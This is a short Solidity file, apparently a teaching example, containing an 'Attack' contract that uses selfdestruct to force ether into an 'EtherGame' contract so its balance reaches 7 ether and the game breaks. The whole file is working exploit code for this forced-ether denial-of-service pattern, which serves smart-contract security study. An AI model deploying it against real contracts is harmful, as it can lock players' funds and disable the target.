// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface IEtherGame {
    function deposit() external payable;
    function claimReward() external;
}

contract Attack {
    IEtherGame etherGame;

    constructor(IEtherGame _etherGame) {
        etherGame = IEtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}